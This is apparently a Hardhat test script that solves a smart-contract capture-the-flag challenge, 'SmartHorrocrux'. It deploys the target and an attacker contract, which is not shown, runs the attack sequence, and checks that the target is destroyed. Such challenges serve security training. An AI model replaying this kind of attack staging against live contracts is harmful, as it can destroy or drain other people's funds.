const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] SmartHorrocrux", function () {
  let deployer, attacker;

  before(async function () {
    [deployer, attacker] = await ethers.getSigners();

    this.SmartHorrocrux = await (
      await ethers.getContractFactory("SmartHorrocrux", deployer)
    ).deploy({ value: 2 });
    await this.SmartHorrocrux.deployed();
  });

  it("Exploit", async function () {
    this.SmartHorrocruxAttacker = await (
      await ethers.getContractFactory("SmartHorrocruxAttacker", attacker)
    ).deploy(await this.SmartHorrocrux.address);
    await this.SmartHorrocruxAttacker.deployed();

    let tx = await this.SmartHorrocrux.fallback();
    await tx.wait();

    tx = await this.SmartHorrocrux.setInvincible();

    tx = await this.SmartHorrocruxAttacker.connect(attacker).attack({
      value: 1,
    });
    await tx.wait();
  });

  after(async function () {
    const tx = this.SmartHorrocrux.alive();
    await expect(tx).to.be.rejectedWith(Error);
  });
});
